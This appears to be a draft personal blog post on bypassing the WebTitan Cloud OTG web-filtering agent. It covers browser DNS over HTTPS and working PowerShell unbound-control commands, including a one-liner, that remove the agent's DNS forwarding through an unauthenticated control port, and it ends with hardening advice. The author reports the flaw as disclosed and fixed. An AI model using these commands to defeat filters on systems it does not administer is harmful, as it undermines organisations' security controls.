+++
title = 'Bypassing WebTitan Cloud OTG 2.1.4'
date = 2026-02-01T14:45:00+00:00
summary = 'Loose computer policies = no more web filter.'
draft = true
+++

Hi, this is edited from an old [Gist](https://gist.github.com/meskuk/f3ebb741e4d3591e79f004a4a62d73c5) of mine.

When I had reported this to WebTitan at the time, it turned out to be **already fixed**.

Still, I would like my achievement to be visible! Please enjoy.

---

Web filtering is very common in organisations. Maybe a library doesn't want you looking for _Linux ISOs_ online,
or your workplace definitely doesn't need you using Instagram on the job.

There are two main ways to achieve web filtering that I've seen: transparently by the network's firewall, or on the endpoint with an agent,
browser plugin or otherwise[^1].

Today we'll be covering [WebTitan Cloud OTG](https://www.titanhq.com/dns-filtering/webtitancloud/) (On The Go), an agent.

# Bypass 1

Turning on DNS over HTTPS in the browser circumvents it. Group Policy could have prevented this quite easily.

# Bypass 2

This is a little lengthier, and requires shell access of some kind, but it means bypassing the filter globally, and not
just in the browser.

To start, let's look in the program directory[^1]:

```
    Directory: C:\Program Files (x86)\WebTitan Cloud OTG\Unbound


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        24/06/2022     08:31           1528 LICENSE.txt
-a----        17/09/2024     16:17           2624 service.conf
-a----        24/06/2022     08:31           2369 service.conf.origin
-a----        09/12/2022     11:40        2954606 unbound-control.exe
-a----        09/12/2022     11:40         113836 unbound-service-install.exe
-a----        09/12/2022     11:40         108963 unbound-service-remove.exe
-a----        09/12/2022     11:40        7978054 unbound.exe
```

[Unbound](https://www.nlnetlabs.nl/projects/unbound/about/) is a well-known, widely used caching DNS resolver. So it's very likely handling our DNS.

## The config
Let's look at the configuration in `service.conf`, which we are thankfully able to access. Some important snippets:

```yaml
forward-zone:
    name: in-addr.arpa
    forward-addr: 156.154.70.1
    forward-addr: 156.154.71.1
    forward-no-cache: yes

forward-zone:
    name: .
    forward-addr: 52.209.170.167
    forward-addr: 52.209.115.90
    forward-no-cache: yes
```

This part forwards queries for the root zone (`.`) and the reverse DNS zone (`in-addr.arpa`) to WebTitan's servers.
Basically, this is the sole reason they can filter our DNS lookups in the first place.

```yaml
# Remote control config section.
remote-control:
	# Enable remote control with unbound-control(8) here.
	# set up the keys and certificates with unbound-control-setup.
	control-enable: yes

	# Set to no and use an absolute path as control-interface to use
	# a unix local named pipe for unbound-control.
	control-use-cert: no
```

**This** part is really important. Unbound allows remote control by connecting to port 8953, which is enabled here.

But if you enable remote control over the network (or from localhost), you should be using certificates, enabling
`control-use-cert`, and putting the client certificates in a protected directory. This way, only legitimate users
can control Unbound.[^2]

Since `control-use-cert` is set to `no`, you don't need to prove your identity to Unbound at all to control the daemon.
How convenient!

## Bypass using unbound-control

We can test out `unbound-control` by listing the forwards in place.

```powershell
PS C:\Program Files (x86)\WebTitan Cloud OTG\Unbound> .\unbound-control.exe -c .\service.conf list_forwards
. IN forward 52.209.170.167 52.209.115.90
in-addr.arpa. IN forward 156.154.70.1 156.154.71.1
```

Excellent! Time to remove one.

```powershell
PS C:\Program Files (x86)\WebTitan Cloud OTG\Unbound> .\unbound-control.exe -c .\service.conf forward_remove .
ok
PS C:\Program Files (x86)\WebTitan Cloud OTG\Unbound> .\unbound-control.exe -c .\service.conf list_forwards
in-addr.arpa. IN forward 156.154.70.1 156.154.71.1
```

And we are done. No more filtering. As a one-liner:

```powershell
cd "C:\Program Files (x86)\WebTitan Cloud OTG\Unbound"; .\unbound-control.exe -c .\service.conf forward off
```
# Key takeaways

This was arguably quite simple and fun to find, but what can we learn from this?

Well, for admins:

- Make sure the user can't browse application directories. The place where I found this made it impossible in File Explorer,
but that brings me to my next point.
- Make sure the user can't open a shell. I did all of this in Windows Terminal. Other methods include using File Explorer's URL bar,
Cygwin, Python, and likely more!

For developers:

- Consider what unprivileged users can do when the admin's safeguards aren't there, or have a hole. Even if I could not modify
application settings, an open port let me manipulate them!

[^1]: Heh, _endpoint_. That feels fancy to say.
[^2]: Cool fact, this configuration flaw is covered in [RHSA-2024-1750](https://access.redhat.com/errata/RHSA-2024:1750), as a bad default.
[^3]: I realise it's more methodical to confirm with `netstat` and `nslookup`, but the block pages and tray icon made it very apparent.